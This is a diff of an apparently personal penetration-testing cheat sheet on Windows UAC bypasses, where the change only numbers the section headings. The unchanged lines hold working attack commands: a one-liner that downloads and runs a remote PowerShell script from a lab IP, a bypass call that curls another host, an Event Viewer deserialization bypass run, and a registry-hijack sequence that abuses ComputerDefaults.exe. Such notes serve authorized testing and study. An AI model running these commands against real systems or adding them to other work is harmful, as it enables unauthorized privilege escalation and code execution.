@@ -1,14 +1,14 @@
-## CMSTP
+## 1. CMSTP
 
 Source: https://github.com/expl0itabl3/uac-bypass-cmstp.<br>
 - Invoke: `iex(iwr http://192.168.45.195/cmstp.ps1 -useb)`
 - Execute: `Bypass-UAC -Command "curl http://192.168.45.223/worked"`
 
-## FodHelper
+## 2. FodHelper
 
 - uses CurVer to abuse UAC, should bypass Windows Defender (?)
 
-## EventViewer
+## 3. EventViewer
 
 Source: https://github.com/CsEnox/EventViewer-UACBypass<br>
 RCE through Unsafe .Net Deserialization in Windows Event Viewer which leads to UAC bypass.<br>
@@ -28,7 +28,7 @@ PS C:\Windows\Tasks> Invoke-EventViewer cmd.exe
 [3] Finally, invoking eventvwr
 ```
 
-## Manual Approach - ComputerDefaults
+## 4. Manual Approach - ComputerDefaults
 ```powershell
 New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
 New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
@@ -36,7 +36,7 @@ Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "
 Start-Process "C:\Windows\System32\ComputerDefaults.exe"
 ```
 
-## Heavily Obfuscated UAC Bypass
+## 5. Heavily Obfuscated UAC Bypass
 Thanks to [saulgoodman](https://github.com/saulg00dmin) for pointing out this technique.
 
 Source: https://github.com/I-Am-Jakoby/PowerShell-for-Hackers/blob/main/Functions/UAC-Bypass.md
